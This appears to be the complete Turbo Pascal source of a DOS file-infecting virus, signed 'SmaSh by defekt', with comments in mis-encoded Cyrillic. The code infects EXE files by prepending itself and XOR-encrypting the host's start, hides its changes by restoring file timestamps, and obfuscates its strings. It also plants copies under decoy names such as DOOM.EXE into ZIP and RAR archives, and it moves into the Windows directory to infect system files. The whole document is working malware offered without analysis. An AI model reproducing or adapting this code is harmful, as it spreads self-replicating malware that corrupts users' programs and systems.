   {$I-,S-}                       {Š®¬ ¤  ª®¬¯¨«ïâ®àã   ã¬¥ìè¥¨¥ ª®¤  ¢¨àãá }
   {$M 5000,0,5000}
   uses dos;                               {ˆá¯®«ì§ã¥¬ äãªæ¨¨ DOSa}
   const au = '-¿µG Yº€®4 Dµµm“¯ÆSmÛ±R²/³„²z¸$ÁA%,O';  {SmaSh by defekt}
         mel = 6418;                       {„«¨  ¢¨àãá }
   var me,we : file;
       met,wet : array[1..mel] of byte;
       s_win : byte;
       bit : byte;
   {----------------------------------------------------------------------------}
   function decrypt(word : string):string; {* áè¨äà®¢é¨ª}
   var i : byte;
       s : string;
   begin
   s := '';
   delete(word,1,4);
   delete(word,length(word)-2,3);
   for i := 1 to length(word) div 2 do
     begin
     s := s + Chr(Ord(word[i]) - ((394 div 5) xor 3));
     delete(word,i+1,1);
     end;
   decrypt := s;
   end;
   {----------------------------------------------------------------------------}
   procedure infarc(ind : byte;prar : string);  {‡ à ¦¥¨¥  àå¨¢®¢}
   const no = ' ';
   var arcn,arcp : string;
       ran : byte;
   begin
   randomize;
   ran := random(4);
   if ran = 1 then arcn :=decrypt('…à‚†Ÿ…’ëŽ‰‘A{*’*¥˜’ŠàŽ*')  {READ.EXE}
     else if ran = 2 then arcn :=decrypt('Ž¯ei*€•Nœí¡¯œs{j’£¥Š’ç¥Š¯') {PHOTO.EXE}
     else if ran = 3 then arcn :=decrypt('*«£*‘êœ†œ†šë{a’*¥‚’”®à*')  {DOOM.EXE}
     else exit;                            {…á«¨ ®«ì -   ¢ëå®¤}
   assign(me,arcn);
   rewrite(me,1);
   blockwrite(me,met,mel);
   close(me);
   if ind = 0 then                         {rar a -o+ -y -c- -tk}                                                     {>nul}
     arcp := decrypt('Tœ²Á|R°fmÔ½Ì¸yÇÃ¶h½fmÙzt®R±±±±mez;¼TÃÛ²a¿[ÄÍ¿6¶uÁÎ²Y¿´}')+no+prar+no+arcn+decrypt('ÒE»9‹D»µÂY¹R¹¿×');
   if ind=1 then                           {pkzip -add -overwrite}                                      {>nul}
     arcp := decrypt('Trsg|I°fmg¿j®*¿amk®Wmkz;¼px,mqzyÆsmlz"°jzpmwzuÁs¸kjgY')+no+prar+no+arcn+decrypt('WE¸a‹Ó»³ÂP¹ÛjëÚ');
   exec(getenv(decrypt('…àY5*gœ‰š# ~*†’¢*‰aP^')),arcp); {COMSPEC}
   erase(me);
   end;
   {----------------------------------------------------------------------------}
   procedure inf;                          {‡ à ¦ ¥¬ ä ©«}
   var a : char;
       i,df : integer;
       time : longint;
   begin
   randomize;
   a := '';                               {Œ¥âª  § à ¦¥®áâ¨}
   getftime(we,time);
   seek(we,0);                             {*¥à¥è«¨ ¢  ç «® ä ©« }
   blockread(we,wet,mel);                  {‘ç¨â «¨  ç «® ä ©«  ¢ ¬ áá¨¢ wet}
   df := random(filesize(we));
   seek(we,df);
   blockread(we,bit,1);
   seek(we,filesize(we));                  {* è«¨ ª®¥æ ä ©« }
   for i := 1 to mel do
     begin
     wet[i] := wet[i] xor bit;             {˜¨äàã¥¬ ¨ § ¯¨áë¢ ¥¬ ¥£®}
     blockwrite(we,wet[i],1);
     end;
   bit := bit xor (ord('d')+ord('f'));
   blockwrite(we,bit,1);                   {Š«îç à áè¨äà®¢ª¨}
   blockwrite(we,a,1);                     {*®áâ ¢¨«¨ ¬¥âªã § à ¦¥®áâ¨}
   seek(we,0);                             {Ž¯ïâì ¢  ç «®}
   blockwrite(we,met,mel);                 {‡ ¯¨á «¨ â¥«® ¢¨àï}
   setftime(we,time);
   close(we);                              {‡ ªàë«¨ ä ©«¨ª}
   end;
   {----------------------------------------------------------------------------}
   procedure chk(path : string);           {*à®¢¥àª  § à ¦¥®áâ¨}
   var b : byte;
   begin
   assign(we,path);
   reset(we,1);
   seek(we,filesize(we)-1);                {* è«¨ ¯®á«¥¤¨© ¡ ©â ä ©« }
   blockread(we,b,1);
   if b= ord('') then
     begin
     s_win := s_win-1; exit; end
     else inf;
   end;                             {…á«¨ ® à ¢¥  è¥© ¬¥âª¥, á«¥¤., § à ¦¥ë}
   {----------------------------------------------------------------------------}
   procedure findf(pt : string);           {*®¨áª ä ©«®¢}
   label lab;
   var SR : searchrec;
       met : string;
       ind : byte;
   begin
   findfirst(pt,$3F,SR);                   {ˆé¥¬ EXE}
   if pt='*.exe' then goto lab;
   if doserror<>0 then exit          {‚®â çâ® ¡ë¢ ¥â, ¥á«¨ ¤®«£® ¯¨á âì ¢¨àãáë  ¯® ®ç ¬..%) }
     else if pt='*.zip' then ind:=0
       else if pt='*.rar' then ind:=1;
   if (ind=0)or(ind=1) then begin met:=SR.name;infarc(ind,SR.name) end
     else
     lab:
     while doserror=0 do
       begin
       if s_win=5 then exit;               {…á«¨ 6 ä ©«, ¢ëå®¤¨¬}
       chk(SR.name);                       {ˆ ç¥   § à ¦¥¨¥}
       s_win := s_win+1;                   {‘ç¥âç¨ª § à ¦¥ëå ä ©«®¢}
       findnext(SR);
       if (ind=0)or(ind=1) then
         begin
         if met=SR.name then exit else
           begin
           met:=SR.name;infarc(ind,SR.name) end;
       end;
     end;
   end;
   {----------------------------------------------------------------------------}
   procedure le;                           {‚®ááâ  ¢«¨¢ ¥¬ ä ©«-®á¨â¥«ì}
   var i : integer;
       p : string;
   begin
   assign(we,paramstr(0));
   reset(we,1);
   blockread(we,met,mel);                  {‘ç¨â «¨ ¢¨àãá ¢ ¬ áá¨¢ met}
   if filesize(we) <= mel then exit;       {…á«¨ ¤«¨  ä «  ¬¥ìè¥ ¤«¨ë ¢¨àãá  - ¢ëå®¤¨¬}
   seek(we,filesize(we)-2);                {ˆé¥¬ ¯®á«¥¤¨¥ ¡ ©âë}
   blockread(we,bit,1);                    {‘ç¨â «¨ ª«îç à áè¨äà®¢ª¨}
   seek(we,filesize(we)-2);
   truncate(we);                           {“¤ «ï¥¬ ¨å}
   seek(we,filesize(we)-mel);              {ˆé¥¬ á®åà ¥®¥  ç «® ä « -®á¨â¥«ï}
   blockread(we,wet,mel);                  {‘ç¨âë¢ ¥¬ ¥£®}
   truncate(we);                           {Žâà¥§ ¥¬}
   seek(we,0);                             {‚  ç «® ä « }
   bit := bit xor (ord('d')+ord('f'));
   for i := 1 to mel do
     begin                                 {* áè¨äà®¢ë¢ ¥¬ ¨ § ¯¨áë¢ ¥¬  ç «®}
     wet[i] := wet[i] xor bit;
     blockwrite(we,wet[i],1);
     end;
   close(we);
   for i := 1 to paramcount do p := p + paramstr(i);
   exec(paramstr(0),p);    {‡ ¯ãáª ¥¬ ¢®ááâ ®¢«¥ë© ä ©«-®á¨â¥«ì á ¯ à ¬¥âà ¬¨}
   close(we);
   end;
   {----------------------------------------------------------------------------}
   begin
   le;                                    {ˆ¤¥¬   ¢®ááâ ®¢«¥¨¥ ä ©« -®á¨â¥«ï}
   findf('*.exe');
   findf('*.zip');findf('*.rar');    {winbootdir}       {ˆé¥¬  àå¨¢ë}
   chdir(GetEnv(decrypt('¿Ž¤wÄÒ¶Ñ»s¯®¼Ô¼õÁR±Û¶Å¿¾ºY;'))); {*¥à¥å®¤¨¬ ¢ á¨áâ. ¤¨à¥ªâ®à¨î}
   findf('*.exe');                        {‡ à ¦ ¥¬ ä ©«ë â ¬}
   findf('*.zip');findf('*.rar');
   end.                                   {ŠŽ*…–!!!!}
